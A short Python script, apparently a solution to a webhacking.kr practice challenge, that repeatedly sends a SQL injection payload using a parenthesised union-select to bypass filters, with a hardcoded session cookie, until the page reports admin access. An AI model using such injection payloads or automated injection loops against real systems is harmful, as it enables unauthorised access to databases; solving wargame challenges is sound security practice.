import requests


url = 'http://webhacking.kr/challenge/web-07/index.php?val='
sql = '0)union(select(char(50))'

cookie = {'PHPSESSID':'9os50jdbbmq3ja39mnjm3i37r0'}
while True:
	res = requests.get(url + sql, cookies = cookie)
	if ('Hello admin' in res.text):
		print(res.text)
		break
	
